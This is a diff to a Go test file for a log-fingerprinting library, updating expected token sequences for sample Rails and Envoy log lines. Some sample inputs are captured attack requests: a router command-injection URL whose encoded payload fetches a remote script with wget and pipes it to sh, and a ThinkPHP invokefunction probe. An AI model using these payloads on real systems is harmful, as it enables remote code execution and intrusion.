@@ -224,7 +224,7 @@ func TestFingerprinter(t *testing.T) {
 		{
 			"sample log 4",
 			`Receive ListRecommendations for product ids:['OLJCESPC7Z', '6E92ZMYYFZ', '1YMWWN1N4O', 'L9ECAV7KIM', '2ZYFJ3GM2N']`,
-			"receive listrecommendations for product <Identifier>",
+			"receive listrecommendations for product <Identifier> <List>",
 			"",
 			nil,
 		},
@@ -662,17 +662,6 @@ func TestFingerprintIdenticality(t *testing.T) {
 			false,
 		},
 		{
-			"id list",
-			[]string{
-				`Receive ListRecommendations for product ids:['OLJCESPC7Z', '6E92ZMYYFZ', '1YMWWN1N4O', 'L9ECAV7KIM', '2ZYFJ3GM2N']`,
-				`Receive ListRecommendations for product ids:['OLJCESPC7Z']`,
-			},
-			[]string{
-				"receive", "listrecommendations", "for", "product", "<Identifier>",
-			},
-			false,
-		},
-		{
 			"urlpaths",
 			[]string{
 				`[a0b0fa04-0423-4760-8757-cb0dc85f90d4] Started GET "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" for 31.220.1.144 at 2025-01-13 17:26:27 +0000`,
@@ -683,22 +672,23 @@ func TestFingerprintIdenticality(t *testing.T) {
 				`[33e7b1c4-e224-42fb-8d47-659e9eb07d39] Started GET "/search/tickets?account_id=11&page=&per_page=&query=test" for 54.162.8.237 at 2025-01-13 18:10:34 +0000`,
 			},
 			[]string{
-				"<UUID>", "started", "<HTTPMethod>", "<Path>", "for", "<IPv4>", "at", "<Date>", "<Time>", "<Number>",
+				"<UUID>", "started", "<HTTPMethod>", "<QuotedString>", "for", "<IPv4>", "at", "<Date>", "<Time>", "<Number>",
 			},
 			false,
 		},
-		// {
-		// 	"http fetch log",
-		// 	[]string{
-		// 		`[2025-01-12T05:28:19.575Z] "POST /tickets HTTP/1.1" 201 - via_upstream - "-" REDACTED 8737 "54.162.8.237,172.25.31.44" "Ruby" "7feb561e-2095-483f-b1c5-0c95c8eb7ddb" "aiops-test10.freshstatus-sta91ng.io" "172.25.26.133:8181" outbound|80|BLUE|aiops-tickets.ams-aiops-tickets-staging.svc.cluster.local 172.25.27.204:45834 172.25.27.204:8080 172.25.31.44:46526 - -`,
-		// 		`[2025-01-13T18:23:37.190Z] "GET /fcp/alb-health HTTP/1.1" 200 - via_upstream - "-" 0 0 0 0 "172.25.31.44" "ELB-HealthChecker/2.0" "1d297bf7-5284-4509-9953-905f42d79089" "172.25.27.114:8080" "172.25.27.204:15021" outbound|15021||istio-ingressgateway.istio-system.svc.cluster.local 172.25.27.114:32850 172.25.27.114:8080 172.25.31.44:3728 - -`,
-		// 		`[2025-01-13T18:22:44.634Z] "GET /search/tickets?account_id=11&page=&per_page=&query=test HTTP/1.1" 200 - via_upstream - "-" 0 2654 42 42 "54.162.8.237,172.25.19.220" "Typhoeus - https://github.com/typhoeus/typhoeus" "426808e9-6a3e-4017-a063-573fe11cc1fc" "search-service.freshstatus-sta91ng.io" "172.25.29.139:8181" outbound|80|BLUE|aiops-search.ams-aiops-search-staging.svc.cluster.local 172.25.27.114:51834 172.25.27.114:8080 172.25.19.220:4130 - -`,
-		// 		`[2025-01-12T19:16:00.058Z] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 - via_upstream - "-" 0 0 2 2 "47.236.49.157,172.25.19.220" "Custom-AsyncHttpClient" "f85b6908-834d-451f-bb44-59dc10dcd02e" "34.225.43.120" "172.25.26.133:8181" outbound|80|BLUE|aiops-tickets.ams-aiops-tickets-staging.svc.cluster.local 172.25.27.204:60516 172.25.27.204:8080 172.25.19.220:13224 - -`,
-		// 		`[2025-01-13T07:54:30.125Z] "POST /search/tickets?account_id=11 HTTP/1.1" 201 - via_upstream - "-" 135 146 13 13 "54.162.8.237,172.25.19.220" "Typhoeus - https://github.com/typhoeus/typhoeus" "c7953b6b-02df-47bd-9970-b8325caca796" "search-service.freshstatus-sta91ng.io" "172.25.29.139:8181" outbound|80|BLUE|aiops-search.ams-aiops-search-staging.svc.cluster.local 172.25.27.114:51834 172.25.27.114:8080 172.25.19.220:15370 - -`,
-		// 	},
-		// 	[]string{},
-		// 	false,
-		// },
+		{
+			"http fetch log",
+			[]string{
+				`[2025-01-13T18:23:37.190Z] "GET /fcp/alb-health HTTP/1.1" 200 - via_upstream - "-" 0 0 0 0 "172.25.31.44" "ELB-HealthChecker/2.0" "1d297bf7-5284-4509-9953-905f42d79089" "172.25.27.114:8080" "172.25.27.204:15021" outbound|15021||istio-ingressgateway.istio-system.svc.cluster.local 172.25.27.114:32850 172.25.27.114:8080 172.25.31.44:3728 - -`,
+				`[2025-01-13T18:22:44.634Z] "GET /search/tickets?account_id=11&page=&per_page=&query=test HTTP/1.1" 200 - via_upstream - "-" 0 2654 42 42 "54.162.8.237,172.25.19.220" "Typhoeus - https://github.com/typhoeus/typhoeus" "426808e9-6a3e-4017-a063-573fe11cc1fc" "search-service.freshstatus-sta91ng.io" "172.25.29.139:8181" outbound|80|BLUE|aiops-search.ams-aiops-search-staging.svc.cluster.local 172.25.27.114:51834 172.25.27.114:8080 172.25.19.220:4130 - -`,
+				`[2025-01-12T19:16:00.058Z] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 - via_upstream - "-" 0 0 2 2 "47.236.49.157,172.25.19.220" "Custom-AsyncHttpClient" "f85b6908-834d-451f-bb44-59dc10dcd02e" "34.225.43.120" "172.25.26.133:8181" outbound|80|BLUE|aiops-tickets.ams-aiops-tickets-staging.svc.cluster.local 172.25.27.204:60516 172.25.27.204:8080 172.25.19.220:13224 - -`,
+				`[2025-01-13T07:54:30.125Z] "POST /search/tickets?account_id=11 HTTP/1.1" 201 - via_upstream - "-" 135 146 13 13 "54.162.8.237,172.25.19.220" "Typhoeus - https://github.com/typhoeus/typhoeus" "c7953b6b-02df-47bd-9970-b8325caca796" "search-service.freshstatus-sta91ng.io" "172.25.29.139:8181" outbound|80|BLUE|aiops-search.ams-aiops-search-staging.svc.cluster.local 172.25.27.114:51834 172.25.27.114:8080 172.25.19.220:15370 - -`,
+			},
+			[]string{
+				"<ISO8601>", "<QuotedString>", "<Number>", "<Identifier>", "<QuotedString>", "<Number>", "<Number>", "<Number>", "<Number>", "<QuotedString>", "<QuotedString>", "<QuotedString>", "<QuotedString>", "<QuotedString>", "<Identifier>", "<IPv4>", "<IPv4>", "<IPv4>",
+			},
+			false,
+		},
 		{
 			"ruby log 1",
 			[]string{
@@ -727,20 +717,20 @@ func TestFingerprintIdenticality(t *testing.T) {
 			},
 			true,
 		},
-		// {
-		// 	"ruby log 3",
-		// 	[]string{
-		// 		"[de5515ba-98a0-4c1d-be32-ae61152cb0b8]   [1m[36mTicket Create (1.8ms)[0m  [1m[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Et dignissimos debitis voluptatum.', 'Omnis dolor error. Deleniti sint hic. Labore omnis id.', 585378, 11, '2025-01-13 17:42:43.050272', '2025-01-13 17:42:43.050272')[0m",
-		// 		"[5b3d31c9-7fc8-4b4b-a38f-b0bcf82434a6]   [1m[36mTicket Create (1.6ms)[0m  [1m[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Occaecati illum voluptas quibusdam.', 'Excepturi tenetur non. Ullam incidunt expedita. Explicabo earum reiciendis.', 584719, 11, '2025-01-13 07:03:52.694513', '2025-01-13 07:03:52.694513')[0m",
-		// 		"[5d8d83e3-d52c-461e-8c7c-4b10eab2a159]   [1m[36mTicket Create (1.7ms)[0m  [1m[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Est sit itaque illum.', 'Aliquam assumenda consequatur. Porro doloribus perspiciatis. Illum cumque voluptate.', 584482, 11, '2025-01-13 03:04:32.161775', '2025-01-13 03:04:32.161775')[0m",
-		// 		"[1a56410f-a24d-4a6b-aad9-dd4267069f20]   [1m[36mTicket Create (1.7ms)[0m  [1m[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Quis beatae enim iste.', 'Reprehenderit voluptas rem. Porro cupiditate amet. Atque recusandae eius.', 585360, 11, '2025-01-13 17:28:12.478078', '2025-01-13 17:28:12.478078')[0m",
-		// 		"[1a41a6cb-28e9-4806-a40b-822a38fb4630]   [1m[36mTicket Create (1.6ms)[0m  [1m[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Dignissimos repellendus et quam.', 'Minima laboriosam aut. Quas sapiente ut. Facilis ipsa animi.', 585165, 11, '2025-01-13 14:07:36.160576', '2025-01-13 14:07:36.160576')[0m",
-		// 	},
-		// 	[]string{
-		// 		"<UUID>", "parameters", "<JSON>",
-		// 	},
-		// 	false,
-		// },
+		{
+			"ruby log 3",
+			[]string{
+				"[de5515ba-98a0-4c1d-be32-ae61152cb0b8]   [1m[36mTicket Create (1.8ms)[0m  [1m[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Et dignissimos debitis voluptatum.', 'Omnis dolor error. Deleniti sint hic. Labore omnis id.', 585378, 11, '2025-01-13 17:42:43.050272', '2025-01-13 17:42:43.050272')[0m",
+				"[5b3d31c9-7fc8-4b4b-a38f-b0bcf82434a6]   [1m[36mTicket Create (1.6ms)[0m  [1m[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Occaecati illum voluptas quibusdam.', 'Excepturi tenetur non. Ullam incidunt expedita. Explicabo earum reiciendis.', 584719, 11, '2025-01-13 07:03:52.694513', '2025-01-13 07:03:52.694513')[0m",
+				"[5d8d83e3-d52c-461e-8c7c-4b10eab2a159]   [1m[36mTicket Create (1.7ms)[0m  [1m[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Est sit itaque illum.', 'Aliquam assumenda consequatur. Porro doloribus perspiciatis. Illum cumque voluptate.', 584482, 11, '2025-01-13 03:04:32.161775', '2025-01-13 03:04:32.161775')[0m",
+				"[1a56410f-a24d-4a6b-aad9-dd4267069f20]   [1m[36mTicket Create (1.7ms)[0m  [1m[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Quis beatae enim iste.', 'Reprehenderit voluptas rem. Porro cupiditate amet. Atque recusandae eius.', 585360, 11, '2025-01-13 17:28:12.478078', '2025-01-13 17:28:12.478078')[0m",
+				"[1a41a6cb-28e9-4806-a40b-822a38fb4630]   [1m[36mTicket Create (1.6ms)[0m  [1m[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Dignissimos repellendus et quam.', 'Minima laboriosam aut. Quas sapiente ut. Facilis ipsa animi.', 585165, 11, '2025-01-13 14:07:36.160576', '2025-01-13 14:07:36.160576')[0m",
+			},
+			[]string{
+				"<UUID>", "ticket", "create", "<Duration>", "insert", "into", "<QuotedString>", "<QuotedString>", "<QuotedString>", "<QuotedString>", "<QuotedString>", "<QuotedString>", "<QuotedString>", "values", "<QuotedString>", "<QuotedString>", "<Number>", "<Number>", "<QuotedString>", "<QuotedString>",
+			},
+			false,
+		},
 		{
 			"ruby log 4",
 			[]string{
@@ -754,7 +744,7 @@ func TestFingerprintIdenticality(t *testing.T) {
 		},
 	}
 
-	fp := NewFingerprinter()
+	fp := NewFingerprinter(WithMaxTokens(25))
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -767,8 +757,8 @@ func TestFingerprintIdenticality(t *testing.T) {
 			for i := 1; i < len(tt.inputs); i++ {
 				fingerprint2, tokenMap2, _, js, err := fp.Fingerprint(tt.inputs[i])
 				require.NoError(t, err)
-				require.Equal(t, fingerprint1, fingerprint2)
 				require.Equal(t, tt.tokens, tokenMap2.Items, "input: %s", tt.inputs[i])
+				require.Equal(t, fingerprint1, fingerprint2)
 				if tt.expectJSON {
 					require.NotNil(t, js)
 				}
